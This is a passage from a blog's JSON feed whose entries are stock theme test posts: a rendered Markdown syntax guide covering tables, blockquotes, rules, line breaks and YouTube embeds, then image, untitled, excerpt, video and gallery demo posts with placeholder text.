table-data-rows\"><span class=\"token punctuation\">|</span><span class=\"token table-data\"> col 3 is      </span><span class=\"token punctuation\">|</span><span class=\"token table-data\"> right-aligned </span><span class=\"token punctuation\">|</span><span class=\"token table-data\">  </span><span class=\"token punctuation\">|</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">|</span><span class=\"token table-data\"> col 2 is      </span><span class=\"token punctuation\">|</span><span class=\"token table-data\"> centered      </span><span class=\"token punctuation\">|</span><span class=\"token table-data\">    </span><span class=\"token punctuation\">|</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">|</span><span class=\"token table-data\"> zebra stripes </span><span class=\"token punctuation\">|</span><span class=\"token table-data\"> are neat      </span><span class=\"token punctuation\">|</span></span></span></pre></td></tr></table></figure><table>\n<thead>\n<tr>\n<th>Tables</th>\n<th style=\"text-align:center\">Are</th>\n<th style=\"text-align:right\">Cool</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>col 3 is</td>\n<td style=\"text-align:center\">right-aligned</td>\n<td style=\"text-align:right\"></td>\n</tr>\n<tr>\n<td>col 2 is</td>\n<td style=\"text-align:center\">centered</td>\n<td style=\"text-align:right\"></td>\n</tr>\n<tr>\n<td>zebra stripes</td>\n<td style=\"text-align:center\">are neat</td>\n<td style=\"text-align:right\"></td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>The outer pipes (</td>\n<td style=\"text-align:center\">) are optional, and you don't need to make the raw Markdown line up prettily. You can also use inline Markdown.</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token table\"><span class=\"token table-header-row\"><span class=\"token table-header important\">Markdown </span><span class=\"token punctuation\">|</span><span class=\"token table-header important\"> Less </span><span class=\"token punctuation\">|</span><span class=\"token table-header important\"> Pretty</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></span><span class=\"token table-line\"><span class=\"token punctuation\">---</span> <span class=\"token punctuation\">|</span> <span class=\"token punctuation\">---</span> <span class=\"token punctuation\">|</span> <span class=\"token punctuation\">---</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></span><span class=\"token table-data-rows\"><span class=\"token table-data\"><span class=\"token italic\"><span class=\"token punctuation\">*</span><span class=\"token content\">Still</span><span class=\"token punctuation\">*</span></span> </span><span class=\"token punctuation\">|</span><span class=\"token table-data\"> <span class=\"token code-snippet code keyword\">`renders`</span> </span><span class=\"token punctuation\">|</span><span class=\"token table-data\"> <span class=\"token bold\"><span class=\"token punctuation\">**</span><span class=\"token content\">nicely</span><span class=\"token punctuation\">**</span></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token table-data\">1 </span><span class=\"token punctuation\">|</span><span class=\"token table-data\"> 2 </span><span class=\"token punctuation\">|</span><span class=\"token table-data\"> 3</span></span></span></pre></td></tr></table></figure><table>\n<thead>\n<tr>\n<th>Markdown</th>\n<th>Less</th>\n<th>Pretty</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><em>Still</em></td>\n<td><code>renders</code></td>\n<td><strong>nicely</strong></td>\n</tr>\n<tr>\n<td>1</td>\n<td>2</td>\n<td>3</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>You can find more information about <strong>LaTeX</strong> mathematical expressions <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYXRoLm1ldGEuc3RhY2tleGNoYW5nZS5jb20vcXVlc3Rpb25zLzUwMjAvbWF0aGpheC1iYXNpYy10dXRvcmlhbC1hbmQtcXVpY2stcmVmZXJlbmNl\">here</span>.</p>\n</blockquote>\n<h2 id=\"blockquotes\"><a class=\"anchor\" href=\"#blockquotes\">#</a> Blockquotes</h2>\n<blockquote>\n<p>Blockquotes are very handy in email to emulate reply text.<br />\nThis line is part of the same quote.</p>\n</blockquote>\n<p>Quote break.</p>\n<blockquote>\n<p>This is a very long line that will still be quoted properly when it wraps. Oh boy let's keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can <em>put</em> <strong>Markdown</strong> into a blockquote.</p>\n</blockquote>\n<h2 id=\"horizontal-rule\"><a class=\"anchor\" href=\"#horizontal-rule\">#</a> Horizontal Rule</h2>\n<p>Three or more...</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token hr punctuation\">---</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Hyphens</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token hr punctuation\">***</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Asterisks</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>___</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Underscores</pre></td></tr></table></figure><hr />\n<p>Hyphens</p>\n<hr />\n<p>Asterisks</p>\n<hr />\n<p>Underscores</p>\n<h2 id=\"line-breaks\"><a class=\"anchor\" href=\"#line-breaks\">#</a> Line Breaks</h2>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Here's a line for us to start with.</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>This line is separated from the one above by two newlines, so it will be a <span class=\"token italic\"><span class=\"token punctuation\">*</span><span class=\"token content\">separate paragraph</span><span class=\"token punctuation\">*</span></span>.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>This line is also a separate paragraph, but...</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>This line is only separated by a single newline, so it's a separate line in the <span class=\"token italic\"><span class=\"token punctuation\">*</span><span class=\"token content\">same paragraph</span><span class=\"token punctuation\">*</span></span>.</pre></td></tr></table></figure><p>Here's a line for us to start with.</p>\n<p>This line is separated from the one above by two newlines, so it will be a <em>separate paragraph</em>.</p>\n<p>This line is also a separate paragraph, but...<br />\nThis line is only separated by a single newline, so it's a separate line in the <em>same paragraph</em>.</p>\n<hr />\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>This is a regular paragraph.</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>table</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>Foo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>table</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>This is another regular paragraph.</pre></td></tr></table></figure><p>This is a regular paragraph.</p>\n<p>&lt;table&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt;Foo&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;/table&gt;</p>\n<p>This is another regular paragraph.</p>\n<h2 id=\"youtube-videos\"><a class=\"anchor\" href=\"#youtube-videos\">#</a> Youtube videos</h2>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">target</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>_blank<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://img.youtube.com/vi/ARted4RniaU/0.jpg<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>IMAGE ALT TEXT HERE<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">width</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>240<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">height</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>180<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">border</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>10<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Pure markdown version:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token url\">[<span class=\"token content\">![IMAGE ALT TEXT HERE</span>](<span class=\"token url\">https://img.youtube.com/vi/ARted4RniaU/0.jpg</span>)</span>](https://www.youtube.com/watch?v=ARted4RniaU)</pre></td></tr></table></figure><p>&lt;a href=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/ZmVhdHVyZT1wbGF5ZXJfZW1iZWRkZWQmYW1wO3Y9QVJ0ZWQ0Um5pYVU=\">https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU</span><br />\n&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbWcueW91dHViZS5jb20vdmkvQVJ0ZWQ0Um5pYVUvMC5qcGc=\">https://img.youtube.com/vi/ARted4RniaU/0.jpg</span>&quot;<br />\nalt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;&lt;/a&gt;</p>\n<p>Pure markdown version:</p>\n<p><a href=\"https://www.youtube.com/watch?v=ARted4RniaU\"><img data-src=\"https://img.youtube.com/vi/ARted4RniaU/0.jpg\" alt=\"IMAGE ALT TEXT HERE\" /></a></p>\n",
            "tags": [
                "Foo",
                "Bar"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/images/",
            "url": "https://zephyr-cyber.github.io.git/images/",
            "title": "Images",
            "date_published": "2013-12-26T14:46:49.000Z",
            "content_html": "<p>This is a image test post.</p>\n<p><img data-src=\"/assets/wallpaper-2572384.jpg\" alt=\"\" /></p>\n<p><img data-src=\"/assets/wallpaper-2311325.jpg\" alt=\"Caption\" /></p>\n<p><img data-src=\"/assets/wallpaper-878514.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://placehold.it/350x150.jpg\" alt=\"Small Picture\" /></p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/no-title/",
            "url": "https://zephyr-cyber.github.io.git/no-title/",
            "title": "",
            "date_published": "2013-12-25T14:57:49.000Z",
            "content_html": "<p>This post doesn't have a title. Make sure it's accessible.</p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/excerpts/",
            "url": "https://zephyr-cyber.github.io.git/excerpts/",
            "title": "Excerpts",
            "date_published": "2013-12-24T16:23:23.000Z",
            "content_html": "<p>The following contents should be invisible in home/archive page.</p>\n<p><span id=\"more\"></span></p>\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce eget urna vitae velit eleifend interdum at ac nisi. In nec ligula lacus. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Sed eu cursus erat, ut dapibus quam. Aliquam eleifend dolor vitae libero pharetra adipiscing. Etiam adipiscing dolor a quam tempor, eu convallis nulla varius. Aliquam sollicitudin risus a porta aliquam. Ut nec velit dolor. Proin eget leo lobortis, aliquam est sed, mollis mauris. Fusce vitae leo pretium massa accumsan condimentum. Fusce malesuada gravida lectus vel vulputate. Donec bibendum porta nibh ut aliquam.</p>\n<p>Sed lorem felis, congue non fringilla eu, aliquam eu eros. Curabitur orci libero, mollis sed semper vitae, adipiscing in lectus. Aenean non egestas odio. Donec sollicitudin nisi quis lorem gravida, in pharetra mauris fringilla. Duis sit amet faucibus dolor, id aliquam neque. In egestas, odio gravida tempor dictum, mauris felis faucibus purus, sit amet commodo lacus diam vitae est. Ut ut quam eget massa semper sodales. Aenean non ipsum cursus, blandit lectus in, ornare odio. Curabitur ultrices porttitor vulputate.</p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/videos/",
            "url": "https://zephyr-cyber.github.io.git/videos/",
            "title": "Videos",
            "date_published": "2013-12-24T16:19:15.000Z",
            "content_html": "<p>This is a video test post.</p>\n<p><strong>Youtube</strong></p>\n<p><div class=\"video-container\"><iframe src=\"https://www.youtube.com/embed/TIbZDRXM-Tg\" frameborder=\"0\" loading=\"lazy\" allowfullscreen></iframe></div></p>\n<p><strong>Vimeo</strong></p>\n<p><div class=\"video-container\"><iframe src=\"https://player.vimeo.com/video/82090131\" frameborder=\"0\" loading=\"lazy\" allowfullscreen></iframe></div></p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/gallery-post/",
            "url": "https://zephyr-cyber.github.io.git/gallery-post/",
            "title": "Gallery Post",
            "date_published": "2013-12-24T16:16:18.000Z",
            "content_html": "<p>This post contains 4 photos:</p>\n<ul>\n<li>Widescreen wallpaper</li>\n<li>Portrait photo</li>\n<li>Dual widescreen wallpaper</li>\n<li>Small photo</li>\n</ul>\n<p>All photos should be displayed properly.</p>\n<p><em>From <span class=\"exturl\" data-url=\"aHR0cDovL3dhbGxiYXNlLmNj\">Wallbase.cc</span></em></p>\n",
            "tags": []
        }
    ]
}